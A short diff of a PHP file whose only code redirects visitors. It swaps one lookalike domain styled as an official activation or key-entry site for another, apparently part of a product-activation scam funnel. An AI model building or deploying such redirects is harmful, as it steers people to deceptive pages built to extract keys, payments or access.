@@ -1,4 +1,4 @@
 <?php
-header("Location: https://official-setup-activate.site/actmca/");
+header("Location: https://official-site-enter-key.site/actmca/");
 die();
 ?>
